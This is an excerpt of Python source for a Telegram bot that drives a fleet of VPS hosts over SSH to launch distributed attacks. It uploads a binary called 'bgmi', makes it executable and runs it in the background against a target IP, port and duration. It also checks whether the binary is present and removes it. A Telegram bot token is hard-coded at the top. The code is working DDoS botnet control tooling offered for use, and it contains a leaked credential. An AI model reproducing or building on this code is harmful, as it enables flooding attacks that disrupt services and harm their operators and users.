...
BOT_TOKEN = "7811371593:AAEgO1hwifgODXfowvHUVHgqd0xzIeX-aD4"  # Replace with your bot token
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
...
def execute_distributed_attack(vps_list, target_ip, target_port, duration, progress_callback=None):
    ...
    for index, (ip, details) in enumerate(vps_list, start=1):
        try:
            ...
            check_cmd = "test -f /home/master/freeroot/root/bgmi && echo 'exists' || echo 'missing'"
            ...
            ssh_execute(ip, details['username'], details['password'], "chmod +x /home/master/freeroot/root/bgmi")
            
            # Execute attack using configured thread count
            attack_cmd = f"nohup /home/master/freeroot/root/bgmi {target_ip} {target_port} {duration} {THREADS_PER_VPS} >/dev/null 2>&1 &"
...
def check_vps_status(message):
    ...
    for ip, details in vps_data['vps'].items():
        ...
        binary_status = ssh_execute(ip, details['username'], details['password'], "test -f /home/master/freeroot/root/bgmi && echo 1 || echo 0")[1].strip()
...
def process_binary_upload(message, ip):
    ...
    try:
        ...
        remote_path = f"/home/master/freeroot/root/bgmi"  # Directly to root as bgmi
...
def process_vps_reset_confirmation(message):
    ...
    for ip, details in vps_data['vps'].items():
        try:
            ...
            ssh_execute(ip, details['username'], details['password'], "rm -f ~/home/master/freeroot/root/bgmi")
